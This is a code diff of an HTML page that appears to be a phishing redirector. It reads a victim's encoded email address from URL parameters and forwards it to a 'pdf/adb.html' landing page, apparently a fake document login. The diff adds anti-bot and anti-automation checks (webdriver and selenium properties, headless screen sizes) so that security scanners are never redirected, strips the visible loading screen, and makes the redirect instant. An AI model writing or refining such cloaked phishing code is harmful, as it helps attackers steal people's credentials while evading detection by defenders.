@@ -1,149 +1,30 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="robots" content="noindex, nofollow" />
-  <meta name="googlebot" content="noindex, nofollow" />
-  <title>System Verification Portal</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>System Resources</title>
   <style>
-    * {
-      box-sizing: border-box;
+    body {
       margin: 0;
       padding: 0;
+      background-color: #f5f5f5;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
     }
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, sans-serif;
-      background: linear-gradient(135deg, #1a202c 0%, #2d3748 100%);
-      color: #e2e8f0;
-      line-height: 1.6;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
-    }
-    .container {
-      background: rgba(26, 32, 44, 0.95);
-      border-radius: 12px;
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
-      padding: 30px;
-      width: 100%;
-      max-width: 500px;
-      text-align: center;
-      border: 1px solid #4a5568;
-    }
-    h1 {
-      font-size: 28px;
-      margin-bottom: 15px;
-      color: #a0aec0;
-      font-weight: 600;
-    }
-    .status {
-      background: #2d3748;
-      padding: 20px;
-      border-radius: 8px;
-      margin: 20px 0;
-      font-size: 16px;
-      border-left: 4px solid #4a6cf7;
-    }
-    .loader-container {
-      display: flex;
-      justify-content: center;
-      margin: 25px 0;
-    }
-    .loader {
-      border: 3px solid #2d3748;
-      border-top: 3px solid #4a6cf7;
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      animation: spin 1s linear infinite;
-    }
-    .progress-bar {
-      height: 6px;
-      background: #2d3748;
-      border-radius: 3px;
-      margin: 20px 0;
-      overflow: hidden;
-    }
-    .progress {
-      height: 100%;
-      background: #4a6cf7;
-      border-radius: 3px;
-      width: 0%;
-      animation: progress 1.5s ease-in-out forwards;
-    }
-    .countdown {
-      font-size: 14px;
-      color: #a0aec0;
-      margin-top: 15px;
-    }
-    .security-indicator {
-      display: flex;
-      justify-content: center;
-      gap: 5px;
-      margin: 15px 0;
-    }
-    .dot {
-      width: 10px;
-      height: 10px;
-      border-radius: 50%;
-      background: #2d3748;
-      animation: pulse 1.5s infinite;
-    }
-    .dot:nth-child(2) { animation-delay: 0.2s; }
-    .dot:nth-child(3) { animation-delay: 0.4s; }
-    .dot:nth-child(4) { animation-delay: 0.6s; }
-    .footer {
-      margin-top: 25px;
-      font-size: 12px;
-      color: #718096;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    @keyframes progress {
-      0% { width: 0%; }
-      100% { width: 100%; }
-    }
-    @keyframes pulse {
-      0%, 100% { background: #2d3748; }
-      50% { background: #4a6cf7; }
+    .hidden-content {
+      display: none;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>System Verification Portal</h1>
-    <div class="status" id="status">Initializing secure environment...</div>
-    
-    <div class="security-indicator">
-      <div class="dot"></div>
-      <div class="dot"></div>
-      <div class="dot"></div>
-      <div class="dot"></div>
-    </div>
-    
-    <div class="loader-container">
-      <div class="loader"></div>
-    </div>
-    
-    <div class="progress-bar">
-      <div class="progress"></div>
-    </div>
-    
-    <div class="countdown" id="countdown">Preparing redirect in 3s</div>
-    
-    <div class="footer">
-      Secure connection • Encrypted transmission • Protected content
-    </div>
+  <div class="hidden-content">
+    <h1>System Resources</h1>
+    <p>Loading system resources, please wait...</p>
   </div>
 
   <script>
     (function() {
-      // Enhanced bot detection with multiple layers
+      // Enhanced bot detection with multiple techniques
       function detectAutomation() {
         // User agent check
         const botPatterns = [
@@ -158,10 +39,12 @@
         }
         
         // Automation properties check
-        if (navigator.webdriver || 
-            window.callPhantom || 
-            window._phantom || 
-            window.phantom) {
+        const automationProps = [
+          'webdriver', '__webdriver_evaluate', '__selenium_evaluate',
+          '__fxdriver_evaluate', '__driver_evaluate', '__webdriver_unwrapped'
+        ];
+        
+        if (automationProps.some(prop => prop in navigator)) {
           return true;
         }
         
@@ -170,15 +53,32 @@
           return true;
         }
         
-        // Screen resolution check
+        // Screen resolution check (headless often has small dimensions)
         if (window.screen.width < 300 || window.screen.height < 300) {
           return true;
+        }
+        
+        // Check for automation-specific objects
+        if (window.document.documentElement.getAttribute('webdriver') ||
+            window.document.documentElement.getAttribute('driver')) {
+          return true;
+        }
+        
+        // Check for Chrome automation
+        if (window.chrome && window.chrome.runtime && window.chrome.runtime.id) {
+          // This might be an extension, but could also be automation
+          try {
+            if (window.chrome.runtime.sendMessage.toString().includes('function')) {
+              // Likely automation
+              return true;
+            }
+          } catch (e) {}
         }
         
         return false;
       }
       
-      // Obfuscated token generation
+      // Generate a secure token
       function generateToken(length = 24) {
         const array = new Uint8Array(length);
         crypto.getRandomValues(array);
@@ -200,6 +100,12 @@
         if (urlParams.has('token')) {
           return urlParams.get('token');
         }
+        if (urlParams.has('id')) {
+          return urlParams.get('id');
+        }
+        if (urlParams.has('ref')) {
+          return urlParams.get('ref');
+        }
         
         // Try session storage as fallback
         if (sessionStorage.getItem('secureData')) {
@@ -209,22 +115,11 @@
         return null;
       }
       
-      // Update countdown display
-      function updateCountdown(seconds) {
-        const countdownEl = document.getElementById('countdown');
-        if (seconds > 0) {
-          countdownEl.textContent = `Preparing redirect in ${seconds}s`;
-        } else {
-          countdownEl.textContent = "Redirecting now...";
-        }
-      }
-      
-      // Main execution function
+      // Execute the redirect with no visual indicators
       function executeRedirect() {
         // Check for automation
         if (detectAutomation()) {
-          document.getElementById('status').textContent = "Verification process requires human interaction";
-          document.querySelector('.countdown').style.display = 'none';
+          // Don't do anything if automation is detected
           return;
         }
         
@@ -232,43 +127,23 @@
         const encodedEmail = getEncodedData();
         
         if (!encodedEmail) {
-          document.getElementById('status').textContent = "Secure session token not found";
-          document.querySelector('.countdown').style.display = 'none';
+          // No data found, don't redirect
           return;
         }
         
-        // Update status
-        document.getElementById('status').textContent = "Establishing secure channel...";
-        
-        // Generate token quickly
+        // Generate token
         const token = generateToken();
         
         // Build redirect URL with less predictable structure
         const randomParam = generateToken(8);
         const redirectUrl = `pdf/adb.html?ref=${randomParam}#email=${encodedEmail}&token=${token}&t=${Date.now()}`;
         
-        // Update status
-        document.getElementById('status').textContent = "Secure connection established";
-        
-        // Start countdown
-        let countdown = 3;
-        updateCountdown(countdown);
-        
-        const countdownInterval = setInterval(() => {
-          countdown--;
-          updateCountdown(countdown);
-          
-          if (countdown <= 0) {
-            clearInterval(countdownInterval);
-            
-            // Use replace to avoid back navigation
-            window.location.replace(redirectUrl);
-          }
-        }, 1000);
+        // Redirect immediately with no visual feedback
+        window.location.replace(redirectUrl);
       }
       
-      // Start the process with minimal delay
-      setTimeout(executeRedirect, 300);
+      // Start the process with a minimal random delay (0-100ms)
+      setTimeout(executeRedirect, Math.floor(Math.random() * 100));
     })();
   </script>
 </body>
